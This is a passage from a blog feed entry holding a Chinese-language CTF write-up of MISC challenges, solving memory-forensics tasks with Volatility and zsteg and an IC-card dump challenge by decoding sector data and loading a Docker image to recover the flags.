data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ooTpipU5eYhTLRG7.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>接着使用 filescan 扫描并过滤带有 flag 字段的文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Tb01SWkGJKYanvcd.png!thumbnail\" alt=\"\"></p>\n<p>找到 flag.txt，dump 下来得到 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000007a09f20 -D ./</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DSFO7E1jqHGlXyyg.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{23030d1c2aa90debdf7757782e9f1ee9}</strong></p>\n<h2 id=\"卑劣的手段\"><a class=\"markdownIt-Anchor\" href=\"#卑劣的手段\">#</a> 卑劣的手段</h2>\n<p>同样是内存取证题，使用工具：vol2</p>\n<p>但是这次 filescan 过滤 flag 字段并没有找到任何的东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=WinXPSP1x64 filescan | findstr flag</span><br></pre></td></tr></table></figure>\n<p>于是使用取证大师的内存取证工具导出 excel 表进行寻找<br>\n结合题目，找到了名称为 Chuyin 的文件夹，使用 vol2 进行 filescan</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=WinXPSP1x64 filescan | findstr Chuyin</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TVsRwmkiLs7LAA5e.png!thumbnail\" alt=\"\"></p>\n<p>找到一张 png，dump 下来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=WinXPSP1x64 dumpfiles -Q 0x0000000002d44eb0 -D ./</span><br></pre></td></tr></table></figure>\n<p>zsteg 一把梭<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IjqvySFc7pLO47KK.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{Hat3une_M1ku}</strong></p>\n<h2 id=\"ic-card\"><a class=\"markdownIt-Anchor\" href=\"#ic-card\">#</a> IC-Card</h2>\n<p>这题我个人感觉是比较难的一道题，因为之前没有碰到过 ICcard 的知识点，趁着这次机会记录一下</p>\n<p>首先先去了解一下 IC 卡的扇区构造</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/U0zUwoWBCfy7m24v.png!thumbnail\" alt=\"\"></p>\n<p>一个扇区分为 4 个区块，每个区块也就是 16 字节，这里使用 winhex 进行查看 bin 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PWYFEVEb1cebKvRZ.png!thumbnail\" alt=\"\"></p>\n<p>这里所选中的是 0 扇区 1 区块，记录了持卡人的姓名和生日</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmNocnQuY29tL3Rvb2xzL2hleC10by1hc2NpaS8=\">https://www.bchrt.com/tools/hex-to-ascii/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xYNtG11XFVvJzOMM.png!thumbnail\" alt=\"\"></p>\n<p>区块 2 便是手机号和余额</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/C6PV0ajOKINGA9a3.png!thumbnail\" alt=\"\"></p>\n<p>这里能看到为 18888888888，580</p>\n<p>根据 IC 卡的扇区构造可以知道，扇区 1 的数据存储 0 在前</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/omy0WMh2N4g1zklW.png!thumbnail\" alt=\"\"></p>\n<p>因此需要将这里的数据进行逆序再进行编码转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = &quot;00 00 00 00 13 66 13 47 13 36 13 E6 13 37 13 17&quot;</span><br><span class=\"line\">s = a[::-1]</span><br><span class=\"line\">print(s)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IhaZgjBEXRXrsG61.png!thumbnail\" alt=\"\"></p>\n<p>得到 q1s1n1c1t1f1，便是 IC-Card 中包含的密码</p>\n<p>解压压缩包，得到 tar 的镜像文件</p>\n<p>使用 docker 进行导入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker load -i card_image.tar #导入tar镜像</span><br><span class=\"line\">docker images #查看镜像ID</span><br><span class=\"line\">docker run -it [IMAGE ID] /bin/sh #运行</span><br></pre></td></tr></table></figure>\n<p>最终在根目录下解码 base64 得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YUZavMCkH5JvVuJs.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{f11agggiveyou!!!}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        }
    ]
}